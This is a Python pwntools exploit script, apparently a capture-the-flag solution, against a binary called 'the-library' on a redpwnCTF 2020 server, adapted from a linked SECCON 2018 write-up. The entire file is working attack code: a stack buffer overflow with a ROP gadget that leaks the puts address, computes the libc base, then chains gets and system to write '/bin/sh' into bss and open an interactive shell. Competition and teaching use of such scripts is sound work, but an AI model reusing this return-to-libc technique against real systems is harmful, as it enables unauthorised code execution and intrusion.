# -*- coding: utf-8 -*-
# https://blog.8f-nai.net/post/2019-01-14-seccon2018/より
from pwn import *

e = ELF("./the-library")
#io = process(e.path)
io = remote("2020.redpwnc.tf", 31350)

puts_plt = p64(0x400520)
puts_got = p64(0x601018)
main_func = p64(0x400637)
bss = p64(0x601040)
gadget = p64(0x400733)

puts_offset = 0x809c0
gets_offset = 0x800b0
system_offset = 0x4f440

payload = "A" * 24
payload += gadget
payload += puts_got
payload += puts_plt
payload += main_func

io.recvuntil("\n")
io.sendline(payload)
io.recvuntil("AAAAAAAAAAAAAAAAAAAAAAAA\x33\x07\x40")
leak = io.recvuntil("W")
leak = leak.replace("\x0a\x57", "") #\nW

leak = leak.strip()
puts_addr = u64(leak.ljust(8, '\0'))
libc_base = puts_addr - puts_offset
gets_addr = libc_base + gets_offset
system_addr = libc_base + system_offset
print("libc_base:" + hex(libc_base))
print("puts_addr:" + hex(puts_addr))
print("gets_addr:" + hex(gets_addr))
print("system_addr:" + hex(system_addr))

payload = "A" * 24
payload += gadget
payload += bss
payload += p64(gets_addr)
payload += gadget
payload += bss
payload += p64(system_addr)

io.recvuntil("\n")
io.sendline(payload)
io.send("/bin/sh\n")
io.interactive()